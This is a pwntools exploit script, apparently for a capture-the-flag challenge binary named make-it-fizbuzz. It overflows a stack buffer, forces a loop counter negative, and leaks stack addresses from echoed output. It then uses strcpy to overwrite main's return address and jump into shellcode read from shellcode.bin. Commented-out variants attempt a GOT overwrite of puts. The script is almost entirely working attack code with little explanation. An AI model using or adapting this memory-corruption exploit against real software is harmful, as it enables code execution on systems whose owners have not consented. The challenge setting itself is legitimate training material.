from pwn import *


context.arch = 'amd64'
context.os = 'linux'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug("/challenge/make-it-fizbuzz", gdbscript = '''
set logging enable on
break *mprotect_stack
c
''')

p.recvuntil(b"0:")  # Fixed: bytes literal

first_payload = b"A" * 24               # overwrite the buffer (4 bytes) up to loop counter
# set the loop counter (ustack_24) to negative number -11 to stay in the loop 
# this will make sure the local_20 get the address of local_30 in the next iteration to be -5
first_payload += p32(0xfffffff5)

p.send(first_payload)

p.recvuntil("You entered: ", timeout = 1)
output = p.recvline()

# Fixed: Handle binary data properly without eval
try:
    result = output.decode('utf-8', errors='ignore').strip()
except:
    result = output #.hex()  # Fallback to hex if decode fails
print(f"FIRST OUTPUT: {output}")

# Fixed: Extract bytes properly and ensure we have enough data
if len(output) >= 34:
    fizzbuzz_address_bytes = output[28:34]
    # Fixed: Pad to 8 bytes before converting to 64-bit integer
    fizzbuzz_address_value = u64(fizzbuzz_address_bytes.ljust(8, b'\x00'))
    print(f"fizzbuzz_address ==> local_28 (src strcpy) ptr: {hex(fizzbuzz_address_value)}")
else:
    print(f"Output too short: {len(output)} bytes")
    fizzbuzz_address_value = 0  # Default value

#print(output)

output = p.recvuntil("Correct answer: FizzBuzz", timeout=2)
print(f"FIRST OUTPUT: {output}")

print("----------------------------------------------------------------------------------------")


second_payload = b"B" * 24          # arbitrary data just to go with the next iteration and copy the local_38 + 4 address to local_28 
second_payload += p32(0xfffffff5)
p.send(second_payload)

p.recvuntil(b"You entered: ", timeout=2)  # Fixed: bytes literal
output = p.recvline()

# Fixed: Handle binary data properly without eval
try:
    result = output.decode('utf-8', errors='ignore').strip()
except:
    result = output #.hex()  # Fallback to hex if decode fails
print(f"SECOND OUTPUT: {output}")

# Fixed: Extract bytes properly and ensure we have enough data
if len(output) >= 34:
    local_38_address_bytes = output[28:34]
    # Fixed: Pad to 8 bytes before converting to 64-bit integer
    local_38_address_value = u64(local_38_address_bytes.ljust(8, b'\x00'))
    print(f"local_38_address ==> local_28 (src strcpy) ptr: {hex(local_38_address_value)}")
else:
    print(f"Output too short: {len(output)} bytes")
    local_38_address_value = 0  # Default value

output = p.recvuntil("Correct answer: ", timeout=2)
output2 = p.recvline()
print(output2)

print("----------------------------------------------------------------------------------------")

mprotect_payload = b"C" * 16
mprotect_payload += p64(local_38_address_value - 0xf)       # local_38 hold the address of mprotect_stack function to replace the PUTS in GOT to jump to from main
mprotect_payload += p32(0xfffffff5)                            # the loop counter should be at the edge to break the loop after the last iteration to execute the address
mprotect_payload += p64(local_38_address_value)                # local_28 to be equal the address of local_38 (already did from previous step but just to fill the gap to read local_20)
mprotect_payload += p64(local_38_address_value + 0x34)         # local_20 to be equal the address of the puts in the GOT

# the strcpy will copy the address of the buffer to the return address location to jump to execute the shellcode from the buffer

p.send(mprotect_payload)

p.recvuntil("You eneted: ", timeout=2)
output = p.recvline()
print(f"THIRD OUTPUT: {output}")
p.recvuntil("Correct answer: ",  timeout=2)
output = p.recvline()
print(f"THIRD OUTPUT: {output}")

print("----------------------------------------------------------------------------------------")
'''
mprotect_payload = b"C" * 16
mprotect_payload += p64(local_38_address_value - 0xf)       # local_38 hold the address of mprotect_stack function to replace the PUTS in GOT to jump to from main
mprotect_payload += p32(0xfffffff5)                            # the loop counter should be at the edge to break the loop after the last iteration to execute the address
mprotect_payload += p64(local_38_address_value)                # local_28 to be equal the address of local_38 (already did from previous step but just to fill the gap to read local_20)
mprotect_payload += p64(local_38_address_value - 0x69)         # local_20 to be equal the address of the puts in the GOT

# the strcpy will copy the address of the buffer to the return address location to jump to execute the shellcode from the buffer

p.send(mprotect_payload)

p.recvuntil("You eneted: ", timeout=2)
output = p.recvline()
print(f"THIRD OUTPUT: {output}")
p.recvuntil("Correct answer: ",  timeout=2)
output = p.recvline()
print(f"THIRD OUTPUT: {output}")

print("----------------------------------------------------------------------------------------")

mprotect_payload = b"C" * 16
mprotect_payload += p64(0x000000000000007f)       # local_38 hold the address of mprotect_stack function to replace the PUTS in GOT to jump to from main
mprotect_payload += p32(0xfffffff5)                            # the loop counter should be at the edge to break the loop after the last iteration to execute the address
mprotect_payload += p64(local_38_address_value)                # local_28 to be equal the address of local_38 (already did from previous step but just to fill the gap to read local_20)
mprotect_payload += p64(local_38_address_value - 0x64)         # local_20 to be equal the address of the puts in the GOT

# the strcpy will copy the address of the buffer to the return address location to jump to execute the shellcode from the buffer

p.send(mprotect_payload)

p.recvuntil("You eneted: ", timeout=2)
output = p.recvline()
print(f"THIRD OUTPUT: {output}")
p.recvuntil("Correct answer: ",  timeout=2)
output = p.recvline()
print(f"THIRD OUTPUT: {output}")
'''
print("----------------------------------------------------------------------------------------")

# Build the payload

with open("shellcode.bin", "rb") as f:
    shellcode = f.read()

padding_len = 16 - len(shellcode)

exploitation_payload = shellcode
exploitation_payload += b"D" * padding_len
exploitation_payload += p64(fizzbuzz_address_value - 0x2e17)     	   # local_38 hold the address of buffer to be copied to the return address location of main to jump to
exploitation_payload += p32(0x0000000e)                            # the loop counter should be at the edge to break the loop after the last iteration to execute the address
exploitation_payload += p64(local_38_address_value)                # local_28 (src strcpy) to be equal the address of local_38 (already did from previous step but just to fill the gap to read local_18)
exploitation_payload += p64(fizzbuzz_address_value - 0x60)         # local_20 (dst strcpy) to be equal the address of return address location of main  

# the strcpy will copy the address of the buffer to the return address location to jump to execute the shellcode from the buffer

p.send(exploitation_payload)

'''
p.recvuntil("You eneted: ", timeout=2)
output = p.recvline()
print(f"FOURTH OUTPUT: {output}")
p.recvuntil("Correct answer: ", timeout=2)
output = p.recvline()
print(f"FOURTH OUTPUT: {output}")
'''
p.recvuntil("You entered: ", timeout = 2)
output = p.recvline()
print(output)
p.recvuntil("Correct answer: ", timeout=2)
output = p.recvline()
print(f"FOURTH OUTPUT: {output}")

p.send(b"f")
p.recvuntil("You entered: ", timeout = 2)
output = p.recvline()
print(output)

p.interactive()
